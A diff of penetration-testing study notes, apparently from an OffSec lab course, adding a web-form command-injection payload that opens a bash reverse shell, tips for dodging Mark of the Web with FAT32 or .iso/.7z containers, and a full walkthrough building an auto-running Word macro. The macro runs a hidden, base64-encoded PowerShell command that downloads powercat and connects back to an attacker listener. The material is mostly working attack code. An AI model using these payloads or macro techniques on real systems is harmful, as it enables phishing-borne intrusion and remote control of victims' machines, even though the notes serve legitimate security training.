@@ -29,7 +29,6 @@
   - [Introduction to web applcation attacks](#introduction-to-web-applcation-attacks)
   - [Common Web Application attacks](#common-web-application-attacks)
   - [SQL injection attacks](#sql-injection-attacks)
-  - [Phishing Basics](#phishing-basics)
   - [Client-site attacks](#client-site-attacks)
   - [Locating public exploits](#locating-public-exploits)
   - [Fixing exploits](#fixing-exploits)
@@ -393,6 +392,10 @@
 - metadata analysis: google dork (site:example.com filetype:pdf), gobuster -x (file extension)
 - `exiftool -a -u brochure.pdf`: retrieve metadata
 - [Canarytoken](https://canarytokens.org/nest/): fingerprint
+- MOTW (Mark of the Web) is not added to files on FAT32-formatted devices because FAT32 does not support NTFS Alternate Data Streams (ADS), which is where MOTW is stored.
+- macros in files downloaded from the internet (with MOTW) are blocked by default, and users can no longer enable them with a single click (like the old “Enable Content” button). Instead, they must explicitly unblock the file via the file properties or follow other administrative steps.
+- possible to avoid getting a file flagged with Mark of the Web (MOTW) by embedding it within container formats such as .7z, .iso, or .img
+- 
 ### 13. Locating public exploits
 ### 14. Fixing exploits
 ### 15. Antivirus evasion
@@ -712,7 +715,69 @@
     ```
     Before encode: "&&bash -c 'bash -i >& /dev/tcp/192.168.45.170/4444 0>&1'"  
     Note: closes a previous string with ", then uses && to run a bash reverse shell connecting back to 192.168.45.170 on port 4444  
-    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.170/4444+0>%261'%22"`  
+    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.170/4444+0>%261'%22"`
+
+### SQL injection attacks
+
+### Client-site attacks  
+- 12.1.1 Information Gathering
+  - Metadata of pdf (Author)
+    `wget http://192.168.203.197/old.pdf`
+    `exiftool -a -u old.pdf`
+  - Find pdf of webserver
+    `gobuster dir -u http://192.168.203.197/ -w /usr/share/wordlists/dirb/common.txt -x pdf`
+- 12.2.3. Leveraging Microsoft Word Macros
+  `xfreerdp3 /u:offsec /p:lab /v:192.168.203.196`
+  Save "MyMacro" as doc file. View Macro  
+    
+  ```
+  Use powershell OneLiner to base64-encode
+  $command = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.203.196/powercat.ps1');powercat -c 192.168.203.196 -p 4444 -e powershell"
+  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+  $encodedCommand = [Convert]::ToBase64String($bytes)
+  $encodedCommand
+
+  nano splitstring.py
+  `str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMAAzAC4AMQA5ADYALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkAOwBwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADkAMgAuADEANgA4AC4AMgAwADMALgAxADkANgAgAC0AcAAgADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA=="`
+
+  n = 50
+
+  for i in range(0, len(str), n):
+	  print("Str = Str + " + '"' + str[i:i+n] + '"')
+
+  python3 ./splitstring.py
+  ```
+
+  ```
+  Sub AutoOpen()
+       MyMacro
+  End Sub
+    
+  Sub Document_Open()
+      MyMacro
+  End Sub
+    
+  Sub MyMacro()
+      Dim Str As String
+        
+      Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+          Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+          Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+       ...
+          Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+          Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+          Str = Str + "A== "
+    
+      CreateObject("Wscript.Shell").Run Str
+  End Sub
+  ```
+
+  ```
+  cd /usr/share/powershell-empire/empire/server/data/module_source/management/
+  python3 -m http.server 80
+  nc -nvlp 4444
+  ```
+  open the MyMacro doc.
     
 ### Password Attacks  
 - 16.1.1 SSH and RDP
